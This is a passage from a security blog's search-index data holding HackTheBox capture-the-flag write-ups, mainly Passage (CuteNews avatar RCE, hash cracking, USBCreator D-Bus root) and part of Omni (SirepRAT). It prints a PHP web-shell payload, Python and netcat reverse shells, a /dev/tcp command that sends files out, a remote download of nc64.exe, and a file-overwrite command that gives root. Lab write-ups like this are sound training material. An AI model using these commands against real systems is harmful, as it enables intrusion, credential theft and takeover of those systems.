","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-doctor/","summary":"Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I\u0026rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user\u0026rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.\nSkills Learned  Server Side Template Injection Splunk UF Exploitation  Tools   Kali Linux (Attacking Machine) - https://www.","tags":["OSCP-like","Linux","Command-injection","SSTI","Splunk","SplunkWhisperer"],"title":"HackTheBox - Doctor"},{"content":"Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user. There is an unpatched package called USBCreator that allows an attacker to perform Arbitrary File Write as root without supplying a password.\nSkills Learned   CuteNews 2.1.2 exploitation\n  USBCreator D-bus exploitation\n  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux hashcat (Windows) - https://hashcat.net/hashcat/ Exiftool - https://exiftool.org/ gdbus - Preinstalled in the target machine.  Reconnaissance Nmap An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.\n→ root@kali «passage» «10.10.14.31» $ mkdir nmap; nmap -sC -sV -oN initial-passage -v 10.10.10.206 # Nmap 7.80 scan initiated Sat Sep 5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206 Nmap scan report for 10.10.10.206 Host is up (0.074s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel As SSH usually requires credentials, I\u0026rsquo;ll enumerate the web server on port 80.\nEnumeration TCP 80 - Website The page presenting a kind of news website called \u0026ldquo;Passage News\u0026rdquo;.\nThe post titled \u0026ldquo;Implemented Fail2Ban\u0026rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.\nInspecting the page sources finds a directory called \u0026ldquo;CuteNews\u0026rdquo;. I also find the hostname as passage.htb.\nAdding /CuteNews to the URL redirects me to a login page.\nI can register as normal user.\nSearchsploit I threw \u0026ldquo;CuteNews 2.1.2\u0026rdquo; to searchsploit and it returned several exploits.\n→ root@kali «passage» «10.10.14.31» $ searchsploit \u0026#39;CuteNews 2.1.2\u0026#39; ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- CuteNews 2.1.2 - \u0026#39;avatar\u0026#39; Remote Code Execution (Metasploit) | php/remote/46698.rb CuteNews 2.1.2 - Arbitrary File Deletion | php/webapps/48447.txt CuteNews 2.1.2 - Authenticated Arbitrary File Upload | php/webapps/48458.txt ------------------------------------------------------------------- --------------------------------- I\u0026rsquo;ll go with the \u0026lsquo;avatar\u0026rsquo; RCE.\nFoothold Shell as www-data CuteNews CVE-2019-11447 It turns out the \u0026lsquo;avatar\u0026rsquo; RCE exploit was a CVE. The exploit module description as follows:\n This module exploits a command execution vulnerability in CuteNews prior to 2.1.2. The attacker can infiltrate the server through the avatar upload process in the profile area. There is no realistic control of the $imgsize function in \u0026ldquo;/core/modules/dashboard.php\u0026rdquo; Header content of the file can be changed and the control can be bypassed. We can use the \u0026ldquo;GIF\u0026rdquo; header for this process. An ordinary user is enough to exploit the vulnerability. No need for admin user. The module creates a file for you and allows RCE.\n I can also exploit this manually.\nI still have the payload that I made using exiftool in my previous Magic write-up. If I don\u0026rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.\n→ root@kali «passage» «10.10.14.31» $ exiftool -Comment=\u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; iamf.jpg I\u0026rsquo;ll rename my jpeg image to iamfr.php, and then I\u0026rsquo;ll upload it as my avatar (Dashboard \u0026ndash;\u0026gt; Personal Options).\nThe image is located at http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php\nI\u0026rsquo;ll send a Python reverse shell through the web shell and capture it on my nc listener.\nhttp://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd=python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.31\u0026#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; I have an interactive shell now.\n→ root@iamf «passage» «10.10.14.31» $ rlwrap nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.206] 37062 bash: cannot set terminal process group (1678): Inappropriate ioctl for device bash: no job control in this shell www-data@passage:/var/www/html/CuteNews/uploads$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@passage:/var/www/html/CuteNews/uploads$ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@passage:/var/www/html/CuteNews/uploads$ www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm-256color Privilege Escalation Shell as paul Internal Enumeration There are two users in home directory.\nwww-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home ls -l /home total 8 drwxr-x--- 17 nadav nadav 4096 Mar 5 09:21 nadav drwxr-x--- 17 paul paul 4096 Mar 5 08:32 paul On /var/www/html/CuteNews/cdata/users, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.\n Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.\n I\u0026rsquo;ll send those files to my machine as one file using cat and dev/tcp trick\nwww-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php \u0026gt; /dev/tcp/10.10.14.31/9000 I redirected it to a file called cdata.users.\n→ root@iamf «passage» «10.10.14.31» $ nc -nvlp 9000 \u0026gt; cdata.users listening on [any] 9000 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.206] 55022 I can perform a bulk decode on the file contents after removing the PHP tags.\n→ root@iamf «passage» «10.10.14.31» $ cat cdata.users| sed \u0026#39;s/\u0026lt;?php[^\u0026gt;]*\u0026gt;//g\u0026#39; | base64 -d cat cdata.users| sed \u0026#39;s/\u0026lt;?php[^\u0026gt;]*\u0026gt;//g\u0026#39; | base64 -d a:1:{s:5:\u0026#34;email\u0026#34;;a:1:{s:16:\u0026#34;paul@passage.htb\u0026#34;;s:10:\u0026#34;paul-coles\u0026#34;;}}a:1:{s:2:\u0026#34;id\u0026#34;;a:1:{i:1598829833;s:6:\u0026#34;egre55\u0026#34;;}}a:1:{s:5:\u0026#34;email\u0026#34;;a:1:{s:15:\u0026#34;ahaha@gmail.com\u0026#34;;s:8:\u0026#34;ivanpogi\u0026#34;;}}a:2:{s:5:\u0026#34;email\u0026#34;;a:1:{s:15:\u0026#34;egre55@test.com\u0026#34;;s:6:\u0026#34;egre55\u0026#34;;}s:4:\u0026#34;name\u0026#34;;a:1:{s:4:\u0026#34;debo\u0026#34;;a:11:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1599412470\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;debo\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;4\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:13:\u0026#34;debo@debo.com\u0026#34;;s:4:\u0026#34;nick\u0026#34;;s:4:\u0026#34;debo\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52\u0026#34;;s:4:\u0026#34;more\u0026#34;;s:60:\u0026#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\u0026#34;;s:6:\u0026#34;avatar\u0026#34;;s:20:\u0026#34;avatar_debo_bash.php\u0026#34; ...\u0026lt;SNIP\u0026gt;... And that was a mess.\nAmong those outputs, this one concerns me.\n\u0026quot;pass\u0026quot;;s:64:\u0026quot;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52\u0026quot; hash-identifier identifies it as SHA-256.\n→ root@kali «passage» «192.168.43.234» $ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068 ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /\u0026#39;__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ######################################################################### -------------------------------------------------- Possible Hashs: [+] SHA-256 [+] Haval-256 ...\u0026lt;SNIP\u0026gt;... It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like /etc/passwd).\nKnowing that, I can add another filter using grep to grab the password hashes.\n→ root@kali «passage» «192.168.43.234» $ cat cdata.users| sed \u0026#39;s/\u0026lt;?php[^\u0026gt;]*\u0026gt;//g\u0026#39; | base64 -d | grep -o -E -e \u0026#34;[0-9a-f]{64}\u0026#34; b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426 41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9 59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4 Cracking the Hashes hashcat recovered five passwords.\n$ ./hashcat.exe -m 1400 hashes/passage.hashes ../rockyou.txt -O --show b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1 e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker 59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario SU - paul I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with su, and password atlanta1 worked on paul.\nwww-data@passage:/home$ su paul su paul Password: atlanta1 paul@passage:~$ Shell as nadav Escalating from paul to nadav is pretty straight forward, I found out that user nadav uses the same SSH keys as user paul.\npaul@passage:~/.ssh$ cat id_rsa.pub \u0026amp;\u0026amp; authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage So I can just SSH from paul to nadav.\npaul@passage:~/.ssh$ ssh nadav@passage.htb Last login: Sun Sep 6 11:12:03 2020 from 127.0.0.1 nadav@passage:~$ id id uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) Shell as root Internal enumeration Since nadav is a member of the sudo group, I can just type sudo su to escalate to root, but unfortunately it requires nadav\u0026rsquo;s password.\nSo I looking around nadav\u0026rsquo;s home directory, and there is a .viminfo file.\nThe file contains the following information.\n...\u0026lt;SNIP\u0026gt;... # Command Line History (newest to oldest): :wq :%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g ...\u0026lt;SNIP\u0026gt;... # File marks: \u0026#39;0 12 7 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026#39;1 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf # Jumplist (newest first): -\u0026#39; 12 7 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -\u0026#39; 1 0 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -\u0026#39; 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 1 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 1 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf # History of marks within files (newest to oldest): \u0026gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026#34; 12 7 \u0026gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf \u0026#34; 2 0 . 2 0 + 2 0 The history of files points to these two configuration files:\n /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf  The 51-ubuntu-admin.conf defines there are only two groups that can be used for authentication when administrator authentication is needed, sudo and admin. This file is used by Polkit, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.\nnadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf [Configuration] AdminIdentities=unix-group:sudo;unix-group:admin I don\u0026rsquo;t really understand in depth about com.ubuntu.USBCreator.conf. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the sudo or the admin group (defined by the 51-ubuntu-admin.conf file)\nnadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026lt;!DOCTYPE busconfig PUBLIC \u0026#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\u0026#34; \u0026#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026#34;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;!-- Only root can own the service --\u0026gt; \u0026lt;policy user=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;allow own=\u0026#34;com.ubuntu.USBCreator\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;!-- Allow anyone to invoke methods (further constrained by PolicyKit privileges --\u0026gt; \u0026lt;policy context=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;com.ubuntu.USBCreator\u0026#34;/\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;org.freedesktop.DBus.Introspectable\u0026#34;/\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;org.freedesktop.DBus.Properties\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt; From here, From here, it looks only nadav that can invoke the methods of this service\nUSBCreator D-Bus Interface Vulnerability There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation1. The research summary as follows:\n\u0026ldquo;A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu patched the relevant packages in response to a vulnerability disclosure from Unit 42.\u0026rdquo;\nThe bug was first reported in 20162, and the affected Ubuntu version is 16.04.\nThe current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.\nnadav@passage:~$ uname -a Linux passage 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Overwrite authorized_keys One of the tools used by the researcher to exploit the vulnerability is a CLI-based called gdbus.\nWith user nadav, I can try to overwrite the authorized_keys file contents in the root directory with my public key.\nI\u0026rsquo;ll put my public key named key in /dev/shm/, and then I\u0026rsquo;ll invoke the following command:\nnadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys true true () I tried to login as root using my private key, and it worked.\n→ root@kali «passage» «10.10.14.31» $ ssh -i root_rsa root@10.10.10.206 Last login: Fri Mar 5 17:33:39 2020 from 10.10.14.7 root@passage:~# ls -l total 12 drwxr-xr-x 2 root root 4096 Jul 21 2020 exploits drwxr-xr-x 2 root root 4096 Jul 21 2020 exploits -r-------- 1 root root 33 Mar 5 17:05 root.txt root@passage:~#   https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-passage/","summary":"Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user.","tags":["OSCP-like","Linux","CVE-2019-11447","Webshell","SSH-key-reuse","Password-cracking","USBCreator","gdbus","Arbitrary-file-write"],"title":"HackTheBox - Passage"},{"content":"Omni is an easy difficulty machine from HackTheBox that runs the IoT version of Windows 10. The machine is known to be vulnerable to SirepRAT, allowing an attacker to gain a remote code execution as SYSTEM. Leveraging the RAT, I\u0026rsquo;m able to gain a foothold on the system and obtain two set of credentials that can be used to decrypt the encrypted flags.\nSkills Learned  Exploiting Windows IoT Decrypting PSCredential object  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux SirepRAT - https://github.com/SafeBreach-Labs/SirepRAT  Reconnaissance Nmap An initial port scan using nmap discovers two open ports: MSRPC on port 135, and a Microsoft IIS on port 8080.\n→ root@iamf «omni» «10.10.14.47» $ nmap -sC -sV -oN nmap/initial-omni -v \u0026#39;10.10.10.204\u0026#39; # Nmap 7.80 scan initiated Sun Aug 23 09:25:53 2020 as: nmap -sC -sV -oN nmap/initial-omni -v 10.10.10.204 Nmap scan report for 10.10.10.204 Host is up (0.056s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8080/tcp open upnp Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Windows Device Portal |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn’t have a title. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Enumeration TCP 8080 - Website Based on the nmap\u0026rsquo;s result, authentication process is required to view the page content, and looks like it uses the basic HTTP authentication.\n With default script (-sC), nmap can retrieves the authentication scheme and realm of a web service that requires authentication.\n nmap identifies the realm as \u0026ldquo;Windows Device Portal\u0026rdquo;, and here is what I found on Google.\nAccording to the table from this documentation, Windows Device Portal (WDP) on port 8080 belongs to the IoT family, which means this machine is most likely running a Windows 10 IoT version.\nSo, without credentials, I can\u0026rsquo;t do anything here.\nFoothold There is a research about unauthenticated remote code execution on Windows IoT Core. The research documents (slides, paper) as well as the exploit tool are provided in the link below.\n https://github.com/SafeBreach-Labs/SirepRAT/  Shell as Omni$ SirepRAT RCE The exploit tool is work against this machine, and I can get a remote code execution as Omni$ / SYSTEM.\nTo get an interactive shell, I\u0026rsquo;ll host Windows nc64.exe using Python HTTP server.\n→ root@iamf «omni» «10.10.14.47» $ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... I\u0026rsquo;ll get the hosted netcat on Omni using PowerShell Invoke-WebRequest command by leveraging the SirepRAT RCE.\n→ root@iamf «omni» «10.10.14.47» $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#34;/c powershell -c Invoke-webrequest -uri 10.10.14.68/nc64.exe -outfile U:\\Users\\Public\\xc.exe\u0026#34; --vv RECV: 00000000: 2A 4C 59 A5 FB 60 04 47 A9 6D 1C C9 7D C8 4F 12 *LY..`.G.m..}.O. SEND: 00000000: 0A 00 00 00 12 01 00 00 01 00 00 00 01 00 00 00 ................ 00000010: 24 00 00 00 36 00 00 00 5A 00 00 00 B8 00 00 00 $...6...Z....... 00000020: 12 01 00 00 00 00 00 00 00 00 00 00 43 00 3A 00 ............C.:. 00000030: 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 \\.W.i.n.d.o.w.s. 00000040: 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 \\.S.y.s.t.e.m.3. 00000050: 32 00 5C 00 63 00 6D 00 64 00 2E 00 65 00 78 00 2.\\.c.m.d...e.x. 00000060: 65 00 2F 00 63 00 20 00 70 00 6F 00 77 00 65 00 e./.c. .p.o.w.e. 00000070: 72 00 73 00 68 00 65 00 6C 00 6C 00 20 00 2D 00 r.s.h.e.l.l. .-. 00000080: 63 00 20 00 49 00 6E 00 76 00 6F 00 6B 00 65 00 c. .I.n.v.o.k.e. 00000090: 2D 00 77 00 65 00 62 00 72 00 65 00 71 00 75 00 -.w.e.b.r.e.q.u. 000000A0: 65 00 73 00 74 00 20 00 2D 00 75 00 72 00 69 00 e.s.t. .-.u.r.i. 000000B0: 20 00 31 00 30 00 2E 00 31 00 30 00 2E 00 31 00 .1.0...1.0...1. 000000C0: 34 00 2E 00 34 00 37 00 2F 00 6E 00 63 00 36 00 4...4.7./.n.c.6. 000000D0: 34 00 2E 00 65 00 78 00 65 00 20 00 2D 00 6F 00 4...e.x.e. .-.o. 000000E0: 75 00 74 00 66 00 69 00 6C 00 65 00 20 00 55 00 u.t.f.i.l.e. .U. 000000F0: 3A 00 5C 00 55 00 73 00 65 00 72 00 73 00 5C 00 :.\\.U.s.e.r.s.\\. 00000100: 70 00 75 00 62 00 6C 00 69 00 63 00 5C 00 78 00 p.u.b.l.i.c.\\.x. 00000110: 63 00 2E 00 65 00 78 00 65 00 c...e.x.e. RECV: 00000000: 00 00 00 00 .... \u0026lt;HResultResult | type: 1, payload length: 4, HResult: 0x0\u0026gt; After that, I\u0026rsquo;ll setup a listener, and send a reverse shell to my listener from Omni.\n→ root@iamf «omni» «10.10.14.47» $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#34;/c U:\\Users\\public\\xc.exe -e cmd.exe 10.10.14.47 1337 \u0026lt;HResultResult | type: 1, payload length: 4, HResult: 0x0 And I have interactive shell now.\n→ root@iamf «omni» «10.10.14.47» $ rlwrap nc -nvlp 1337 listening on [any] 1337 ... connect to [10.10.14.47] from (UNKNOWN) [10.10.10.204] 49689 Microsoft Windows [Version 10.0.17763.107] Copyright (c) Microsoft Corporation. All rights reserved. PS C:\\windows\\system32\u0026gt;$env:username Omni$ Internal Enumeration Enumerating for the flags finds they are located at C:\\Data\\Users\\administrator\\root.txt and C:\\Data\\Users\\app\\user.txt. Since I have access as the SYSTEM itself, I can read both the user flag and the root flag directly, but the flags are encrypted.\nroot.txt:\nPS C:\\\u0026gt; type C:\\Data\\Users\\administrator\\root.txt type root.txt \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;flag\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; user.txt:\nPS C:\\\u0026gt; type C:\\Data\\Users\\app\\user.txt type C:\\Data\\Users\\app\\user.txt \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredent^M^M \u0026lt;T\u0026gt;System.Management.Automation.PSCredent^M^M \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;flag\u0026lt;/S\u0026gt; \u0026lt;SS 